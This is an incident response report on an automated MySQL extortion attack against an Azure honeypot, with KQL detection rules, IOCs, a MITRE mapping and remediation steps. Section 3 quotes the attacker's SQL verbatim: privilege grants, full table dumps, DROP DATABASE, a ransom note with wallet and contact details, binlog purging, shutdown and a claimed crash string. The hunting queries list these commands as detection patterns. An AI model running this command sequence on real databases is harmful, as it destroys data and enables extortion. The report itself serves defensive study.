# Incident Response & Threat Hunting Report: MySQL Extortion Campaign on Windows Honeypot
 
**Target Asset:** `corp-tx-prl1` (Azure Windows 11 Enterprise VM)  
**Incident ID:** `INC-2026-0817-MYSQL-RANSOM`  
**Classification:** Database Ransomware / Data Exfiltration / Application-Layer Breach  
**Severity:** Critical (P1)  
**Date of Incident:** August 17, 2026 – August 20, 2026  
**Telemetry Sources:** Microsoft Defender for Endpoint (MDE), Log Analytics Workspace (`LAW-Cyber-Range`), Azure Monitor Agent (AMA), MySQL General/Audit Logs (`MySQLAudit_CL`)  

---

## 1. Executive Summary

Between **August 17, 2026** and **August 20, 2026**, an intentionally exposed Windows 11 honeypot virtual machine (`corp-tx-prl1`) hosted in Microsoft Azure was subjected to continuous external reconnaissance, automated brute-forcing, and direct database exploitation. 

At **17:00:21 UTC on August 17, 2026**, an automated threat actor operating from `64.89.163.176` established remote administrative access to the MySQL service exposed on public port **TCP 3306**. Over the subsequent 47 seconds, the actor:
1. Enumerated internal schemas and database architectures.
2. Exfiltrated sensitive customer records, financial orders, and credential hashes from `tx_corp_01`.
3. Permanently dropped operational databases (`tx_corp_01`, `sakila`, `world`).
4. Instantiated an extortion schema (`RECOVER_YOUR_DATA`) demanding **0.0132 BTC** (~$800 USD) for data recovery.
5. Executed anti-forensic commands (`RESET MASTER` / `PURGE BINARY LOGS`) to inhibit point-in-time database restoration.
6. Triggered an intentional daemon shutdown and denial-of-service crash via malformed JSON schema evaluation.

Subsequent comparative Digital Forensics & Incident Response (DFIR) analysis of MDE live response packages confirmed that **the compromise remained isolated strictly to the database engine layer**. No host-level operating system persistence, lateral movement, or ransomware file encryption occurred on the Windows OS.

```
+-----------------------------------------------------------------------------------------+
|                                    ATTACK TIMELINE                                      |
+-----------------------------------------------------------------------------------------+
| 2026-08-17 15:09:19 UTC | Honeypot Exposed to Public Internet (NSG Inbound Any/Any)     |
| 2026-08-17 17:00:21 UTC | Attacker Ingress via 64.89.163.176 (root@%)                   |
| 2026-08-17 17:00:30 UTC | Privilege Escalation (GRANT CREATE, DROP ON *.* TO root@%)    |
| 2026-08-17 17:00:33 UTC | Schema Enumeration & Exfiltration (tx_corp_01, sakila, world) |
| 2026-08-17 17:01:02 UTC | Schema Destruction (DROP DATABASE tx_corp_01, sakila, world)  |
| 2026-08-17 17:01:04 UTC | Extortion Table Injected (0.0132 BTC demanded)                |
| 2026-08-17 17:01:05 UTC | Anti-Forensics Executed (RESET MASTER, PURGE BINARY LOGS)     |
| 2026-08-17 17:01:07 UTC | Daemon Crash / DoS (SHUTDOWN & Malformed JSON Injection)      |
| 2026-08-20 16:21:01 UTC | Endpoint Isolated via Defender for Endpoint                   |
+-----------------------------------------------------------------------------------------+
```

---

## 2. Honeypot Architecture & Detection Engineering Setup

The objective of this engagement was to build an enterprise-realistic Windows 11 workstation/server hybrid, instrument granular telemetry collection, deploy detection rules into **Microsoft Sentinel / Log Analytics**, and deliberately expose the host to observe real-world threat actor behaviors.

```
                                  HONEYPOT LAB TOPOLOGY

  [ Threat Actors ] 
  (Public Internet)
          |
          v
  +---------------+
  |  Azure NSG    |  (Inbound Rules Opened: TCP 3306, TCP 3389)
  +-------+-------+
          |
          v
  +-----------------------------------------------------------------------+
  | Virtual Machine: corp-tx-prl1 (Windows 11 Enterprise)                 |
  |                                                                       |
  |   +-----------------------------------+   +-------------------------+ |
  |   | MySQL Database Engine (Port 3306) |   | User Accounts           | |
  |   | - Schemas: tx_corp_01, sakila     |   | - Administrator (weak)  | |
  |   | - General Log: mysql_general.log  |   | - Guest (RDP enabled)   | |
  |   +-----------------+-----------------+   +-------------------------+ |
  |                     |                                                 |
  |                     v (Local File Watcher)                            |
  |   +-----------------------------------+                               |
  |   | Azure Monitor Agent (AMA)         |                               |
  |   +-----------------+-----------------+                               |
  +---------------------|-------------------------------------------------+
                        |
                        | HTTPS Outbound (TCP 443 via DCR)
                        v
  +-----------------------------------------------------------------------+
  | Log Analytics Workspace (LAW-Cyber-Range) & Microsoft Sentinel         |
  |                                                                       |
  |   - Custom Table: MySQLAudit_CL (Ingesting raw query & auth logs)     |
  |   - Endpoint Telemetry: DeviceLogonEvents, DeviceProcessEvents        |
  |   - SIEM Detections: Pre-armed KQL Analytics Rules                    |
  +-----------------------------------------------------------------------+
```

### Pre-Armed KQL Analytics Rules

Before exposing the honeypot, two custom detection rules were authored and armed in Microsoft Sentinel:

#### Rule 1: Unauthorized Virtual Machine Logon (`CDF-CORP-TX-PRL1`)
```kusto
let MyDevice = "corp-tx-prl1";
DeviceLogonEvents
| where DeviceName =~ MyDevice
| where AccountName in~ ("administrator", "guest")
| where ActionType == "LogonSuccess"
| project TimeGenerated, RemoteIP, AccountName, DeviceName, ActionType, LogonType
```
* **Tactics:** Initial Access (TA0001)
* **Entity Mappings:** Host = `DeviceName`, IP = `RemoteIP`

#### Rule 2: Remote MySQL Administrative Logon (`CDF-CORP-TX-PRL1-MySQL`)
```kusto
let MyDevice = "corp-tx-prl1";
let FailedConnections =
    MySQLAudit_CL
    | extend RawData = replace_string(RawData, "	", " ")
    | extend DeviceName = tostring(split(_ResourceId, "/")[-1])
    | where DeviceName =~ MyDevice
    | where RawData has "Access denied"
    | extend ConnectionId = extract(@"^\S+\s+(\d+)\s+Connect", 1, RawData)
    | distinct ConnectionId;
MySQLAudit_CL
    | extend RawData = replace_string(RawData, "	", " ")
    | extend DeviceName = tostring(split(_ResourceId, "/")[-1])
    | where DeviceName =~ MyDevice
    | where RawData has "Connect"
    | extend ConnectionId = extract(@"^\S+\s+(\d+)\s+Connect", 1, RawData)
    | extend ActionType = case(
        RawData has "Access denied", "LogonFailure",
        ConnectionId in (FailedConnections), "Ignore",
        "LogonSuccess"
    )
    | where ActionType == "LogonSuccess"
    | extend Username = replace_string(tostring(split(tostring(split(RawData, "@")[0]), " ")[-1]), "'", "")
    | extend IpAddress = replace_string(tostring(split(split(RawData, "@")[1], " ")[0]), "'", "")
    | project TimeGenerated, DeviceName, Username, IpAddress, ActionType, RawData
    | order by TimeGenerated desc
```
* **Tactics:** Initial Access (TA0001), Valid Accounts (T1078.003)
* **Entity Mappings:** Host = `DeviceName`, IP = `IpAddress`

---

## 3. Deep-Dive Attack Analysis & Kill Chain

```
               MITRE ATT&CK KILL CHAIN STAGES OBSERVED

    [ Initial Access ] ──> Exposed MySQL 3306 (root@64.89.163.176)
            │
            v
    [ Reconnaissance ] ──> SHOW DATABASES / Information Schema Checks
            │
            v
    [ Priv Escalation ] ──> GRANT ALL / GRANT CREATE, DROP TO root@%
            │
            v
    [ Exfiltration ]   ──> SELECT * FROM tx_corp_01.* (Credentials, Orders)
            │
            v
    [ Impact & Ransom ]──> DROP DATABASE tx_corp_01 -> INSERT Ransom Note
            │
            v
    [ Anti-Forensics ] ──> RESET MASTER / PURGE BINARY LOGS -> SHUTDOWN
```

### Step 1: Initial Access & Exploitation (T1190 / T1078.003)
At **17:00:21 UTC on Aug 17, 2026**, IP address `64.89.163.176` connected to port 3306 and successfully authenticated as `root` without cryptographic transport layer negotiation (plain TCP/IP):
```text
2026-08-17T17:00:21.063278Z   16 Connect root@64.89.163.176 on  using TCP/IP
```

### Step 2: Privilege Escalation & Discovery (T1069.001 / T1087.002)
The actor verified full administrative control across the database server, granting global creation and deletion rights to wildcard network root:
```sql
SHOW DATABASES
GRANT CREATE, DROP ON *.* TO `root`@`%`
SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'tx_corp_01'
SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
```

### Step 3: Schema Exfiltration (T1005 / T1041)
Between **17:00:33 UTC** and **17:01:01 UTC**, the adversary iterated over every table in all schemas. Most critically, corporate data in `tx_corp_01` was fully dumped:
```sql
USE `tx_corp_01`
SHOW tables
SELECT COLUMN_NAME, DATA_TYPE
SELECT * FROM `credentials`
SELECT COLUMN_NAME, DATA_TYPE
SELECT * FROM `customers`
SELECT COLUMN_NAME, DATA_TYPE
SELECT * FROM `orders`
SELECT COLUMN_NAME, DATA_TYPE
SELECT * FROM `payments`
```
<img width="720" height="298" alt="image" src="https://github.com/user-attachments/assets/89ec7ac8-900e-43a0-a2a3-4db63241fb93" />

### Step 4: Schema Destruction & Ransom Inscription (T1485 / T1486)
At **17:01:02 UTC**, all legitimate schemas were dropped in rapid succession and replaced with an extortion note:
```sql
DROP DATABASE 'recover_your_data'
DROP DATABASE `sakila`
DROP DATABASE `tx_corp_01`
DROP DATABASE `world`
CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
USE RECOVER_YOUR_DATA
CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0132 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')
INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2hxip@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2HXIP')
```
<img width="771" height="145" alt="image" src="https://github.com/user-attachments/assets/77f0fce6-fa0a-4d23-b5f3-73dd07338447" />

<img width="1880" height="300" alt="image" src="https://github.com/user-attachments/assets/716a8c8c-41f4-4e6b-a61f-583b55a4e253" />


### Step 5: Anti-Forensics & Denial of Service (T1070.002 / T1499)
To hinder recovery through MySQL binary log replay, the attacker purged all transactional binlogs, revoked root privileges to lock out administrators, and crashed the daemon:
```sql
RESET MASTER
SHOW MASTER STATUS
PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'
GRANT SHUTDOWN ON *.* TO `root`@'%'
SHUTDOWN
SELECT JSON_SCHEMA_VALID('{"enum":[0]}', '"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"')
```
---

## 4. Digital Forensics & Differential Baseline Analysis

Using Microsoft Defender for Endpoint (MDE) Live Response, full investigation packages were extracted **pre-breach** (`pre-breachMDE_Investigation_Package.zip`) and **post-breach** (`_2.zip`).

```
                    FORENSIC COMPARISON MATRIX

        BASELINE PACKAGE                     POST-BREACH PACKAGE
  +--------------------------+           +--------------------------+
  | Processes.csv            |   VS      | Processes_2.csv          |
  | ScheduledTasks.csv (251) |  DIFF     | ScheduledTasks_2.csv     |
  | Services.csv             | =======>  | Services_2.csv           |
  | Autoruns.txt             |           | Autoruns_2.txt           |
  | ActiveNetConnections.txt |           | ActiveNetConnections_2   |
  +--------------------------+           +--------------------------+
```

### Differential Findings

| Artifact Category | Pre-Breach Baseline | Post-Breach Capture | Forensic Interpretation |
| :--- | :--- | :--- | :--- |
| **Running Processes** | Baseline Windows OS processes (`msedge`, `explorer`) | Added `SearchProtocolHost.exe`, MDE collection scripts (`SenseIR.exe`) | **Benign.** Activity reflects normal OS telemetry and live-response collection scripts. |
| **Scheduled Tasks** | 251 Active Scheduled Tasks | 251 Active Scheduled Tasks (Identical byte-for-byte) | **Clean.** Zero persistence scheduled tasks were introduced. |
| **Services / Drivers** | Standard Azure Windows Services | `DeviceInstall` & `WPDBusEnum` moved to Running state | **Benign.** Normal Plug-and-Play device polling. |
| **Network Sockets** | Active loopback & Azure agent pipes | Azure push endpoints (`168.63.129.16`) in `TIME_WAIT` | **Clean.** No active Command-and-Control (C2) beacons or unauthorized foreign sockets. |
| **Filesystem / Registry** | Baseline system configurations | Normal WFP firewall provider hashes verified | **Clean.** No OS-level ransomware encryptor was deployed. |

**DFIR Conclusion:** The incident was entirely an **application-layer database breach**. The attacker automated the intrusion over TCP 3306 without attempting host shell breakout (e.g., `INTO OUTFILE` webshell execution, UDF dynamic library injection, or LSASS credential dumping).

---

## 5. Threat Actor Profile & Indicators of Compromise (IOCs)

### Threat Intelligence & Ingress Sources

| IP Address | Country / ASN | Protocol | Observed Activity |
| :--- | :--- | :--- | :--- |
| `64.89.163.176` | United States (Hosting) | TCP/IP | **Primary Threat Actor.** Authenticated as root, dumped all tables, dropped databases, and placed ransom note. |
| `64.89.163.0/24` | United States (Hosting) | TCP/IP | **Botnet Verification Range.** Follow-up connections from `.166`, `.154`, `.178`, `.80`, `.138` re-verifying ransom table state. |
| `202.189.4.123` | APNIC Region | TCP/IP | **Automated Scanner.** 11 multi-threaded concurrent logon attempts targeting internal `mysql` password hashes. |
| `77.90.185.30` | Lithuania (Limited Network) | SSL/TLS | **Persistent Probe.** 22+ recurrent administrative root logins executing `SELECT @@max_allowed_packet`. |
| `213.209.159.115` | Germany (Hosting) | SSL/TLS | **Persistent Probe.** Scheduled administrative polling across the 72-hour window. |
| `34.14.13.251` | Google Cloud | TCP/IP | Incompatible scanner generating MySQL handshake protocol errors. |

### Extortion & Campaign Artifacts

| Indicator Type | Value | Context |
| :--- | :--- | :--- |
| **Bitcoin Wallet** | `bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm` | Extortion payment wallet specified in ransom query note. |
| **Bitcoin Wallet (Campaign)** | `bc1qk9kvwhzt60u3eqcjllqlj44h0tj7w7n72apz99` | Associated secondary wallet observed across campaign telemetry. |
| **Email Address** | `ak+2hxip@onionmail.org` | Extortion contact email (Victim DATAID: `2HXIP`). |
| **Email Address** | `ak+28t2@onionmail.org` | Associated campaign extortion mailbox. |
| **Ransom Redirection URL** | `hxxps://bit[.]ly/22mysql` | Shortlink for extortion instructions. |
| **Tracking URL** | `hxxps://2no[.]co/2mysql` | Attacker click-tracking link embedded in database. |
| **Purged Binlog Name** | `josh-mde-lab-bin.000001` | Transactional binary log explicitly purged during anti-forensics. |

---

## 6. MITRE ATT&CK Mapping

```
+------------------------------------------------------------------------------------------+
| INITIAL ACCESS   | DISCOVERY        | COLLECTION       | DEFENSE EVASION | IMPACT        |
+------------------+------------------+------------------+-----------------+---------------+
| T1190: Public    | T1087.002:       | T1005: Data from | T1070.002:      | T1485: Data   |
| Application      | Database User    | Local System     | Clear Logs /    | Destruction   |
| Exposure (3306)  | Enumeration      | (SELECT *)       | Purge Binlogs   | (DROP DB)     |
|                  |                  |                  |                 |               |
| T1078.003:       | T1069.001:       | T1041: Exfiltration| T1562.001:    | T1486: Data   |
| Valid Account:   | Schema & Table   | over Unencrypted | Revoke Admin    | Extortion     |
| root@%           | Structure Recon  | MySQL Protocol   | Privileges      | (Ransom Table)|
|                  |                  |                  |                 |               |
|                  |                  |                  |                 | T1499: App    |
|                  |                  |                  |                 | Crash / DoS   |
+------------------------------------------------------------------------------------------+
```

| MITRE ATT&CK ID | Tactic | Technique Name | Evidence & Log Context |
| :--- | :--- | :--- | :--- |
| **T1190** | Initial Access | Exploit Public-Facing Application | MySQL daemon listening directly on public internet port 3306 without perimeter restriction. |
| **T1078.003** | Initial Access | Valid Accounts: Local Accounts | Direct authentication using default administrative user `root@%`. |
| **T1087.002** | Discovery | Account Discovery: Email/User Accounts | Schema query dumping user emails and profile structures in `tx_corp_01.customers`. |
| **T1069.001** | Discovery | Permission Groups Discovery | Enumerating database schemas using `SHOW DATABASES` and `information_schema`. |
| **T1005** | Collection | Data from Local System | Bulk querying via `SELECT *` on `credentials`, `orders`, and `payments`. |
| **T1041** | Exfiltration | Exfiltration Over C2/Application Protocol | Direct exfiltration of entire table contents over established database session. |
| **T1070.002** | Defense Evasion | Indicator Removal: Clear FreeBSD/Linux/DB Logs | Executing `RESET MASTER` and `PURGE BINARY LOGS` to wipe transaction replays. |
| **T1562.001** | Defense Evasion | Impair Defenses: Disable/Modify Tools | Executing `REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'root'@'%'` to lock out legitimate responders. |
| **T1485** | Impact | Data Destruction | Dropping operational corporate and test databases (`DROP DATABASE tx_corp_01`). |
| **T1486** | Impact | Data Encrypted / Destroyed for Impact | Database ransom table creation demanding 0.0132 BTC. |
| **T1499** | Impact | Endpoint Denial of Service: Service Exhaustion | Executing `SHUTDOWN` and malformed `JSON_SCHEMA_VALID` queries to crash the MySQL service. |

---

## 7. Containment, Eradication & Remediation Playbook

```
                         INCIDENT RESPONSE PLAYBOOK WORKFLOW

   [ 1. CONTAINMENT ]       [ 2. ERADICATION ]         [ 3. RECOVERY ]         [ 4. POST-INCIDENT ]
  +------------------+     +------------------+     +--------------------+    +--------------------+
  | - Isolate VM via |     | - Delete Rogue   |     | - Restore from     |    | - Reset all        |
  |   MDE Portal     | ==> |   Extortion DBs  | ==> |   Offline Snapshot | => |   Exfiltrated PII  |
  | - Restrict NSG   |     | - Drop root@%    |     | - Rebuild Binlogs  |    | - Deploy Bastion   |
  |   to Private IP  |     | - Rotate Secrets |     | - Verify Hashes    |    | - Tighten Alerts   |
  +------------------+     +------------------+     +--------------------+    +--------------------+
```

### Phase 1: Immediate Containment (Executed)
1. **Network Boundary Isolation:** Update Azure Network Security Group (NSG) and Windows Advanced Firewall to drop all inbound traffic on TCP 3306 and TCP 3389 from the internet.
2. **MDE Host Isolation:** Initiated Microsoft Defender for Endpoint host isolation on `corp-tx-prl1` at `2026-08-20 16:21:01 UTC` to prevent potential lateral egress.

### Phase 2: Eradication
1. **Remove Extortion Artifacts:** Drop malicious database schemas (`DROP DATABASE RECOVER_YOUR_DATA;`).
2. **Account Hardening:**
   ```sql
   DROP USER 'root'@'%';
   CREATE USER 'root'@'localhost' IDENTIFIED BY '<High-Entropy-Passphrase>';
   GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
   FLUSH PRIVILEGES;
   ```
3. **OS Account Cleanup:** Disable local `Guest` account and delete unauthorized administrative users created during exposure.

### Phase 3: Recovery
1. **Cold Snapshot Restoration:** Because binary logs were destroyed (`RESET MASTER`), transactional point-in-time recovery is unfeasible. Restore all operational schemas (`tx_corp_01`, `sakila`, `world`) from cold, immutable offline backups taken prior to `2026-08-17 15:00:00 UTC`.
2. **Schema Verification:** Perform row count and cryptographic checksum validation against pre-incident catalog baselines.

### Phase 4: Lessons Learned & Strategic Recommendations

| Priority | Strategic Recommendation | Implementation Action |
| :--- | :--- | :--- |
| **P1** | **Zero Public Database Exposure** | Bind MySQL strictly to `127.0.0.1` or private VNet subnets. Require Azure Bastion or VPN with MFA for remote administration. |
| **P1** | **Enforce Strict Principle of Least Privilege** | Disallow wildcard network hosts (`%`) on privileged database accounts. Enforce Named Administrative Accounts with MFA. |
| **P2** | **Deploy Sentinel Anomaly Analytics** | Arm automated alert rules in Microsoft Sentinel for high-frequency connection attempts, bulk `SELECT *` commands, and any execution of `DROP DATABASE` or `RESET MASTER`. |
| **P2** | **Immutable & Air-Gapped Backups** | Implement automated point-in-time database snapshots stored in append-only, immutable Azure Blob Storage with log retention locks. |
| **P3** | **Data Breach Protocol Activation** | In a production scenario, initiate incident breach disclosure workflows for credentials and customer records exposed in `tx_corp_01`. |

---

## 8. KQL Hunting Library

Useful KQL hunting queries developed during this investigation for SOC / DFIR operations:

```kusto
// 1. Detect Bulk Data Exfiltration or Database Deletions in MySQL Audit Logs
MySQLAudit_CL
| extend RawData = replace_string(RawData, "	", " ")
| where RawData has_any ("DROP DATABASE", "SELECT *", "RESET MASTER", "PURGE BINARY")
| project TimeGenerated, DeviceName=tostring(split(_ResourceId, "/")[-1]), RawData
| order by TimeGenerated asc

// 2. Identify Top External Failed & Successful Database Logon IPs
MySQLAudit_CL
| extend RawData = replace_string(RawData, "	", " ")
| where RawData has "Connect"
| extend IpAddress = extract(@"@([^\s]+)\s+on", 1, RawData)
| extend Outcome = iff(RawData has "Access denied", "Failed", "Success")
| summarize TotalAttempts = count(), 
            SuccessfulLogons = countif(Outcome == "Success"), 
            FailedLogons = countif(Outcome == "Failed") 
            by IpAddress
| where isnotempty(IpAddress)
| order by TotalAttempts desc

// 3. Correlate Inbound Network Flows to Denied Host Outbound Flows
NTANetAnalytics
| where isnotempty(SrcVm)
| where SrcVm endswith "corp-tx-prl1"
| where DeniedOutFlows >= 1
| project TimeGenerated, FlowType, FlowStatus, SrcIp, SrcPorts, DestIp, DestPort
| order by TimeGenerated desc
```
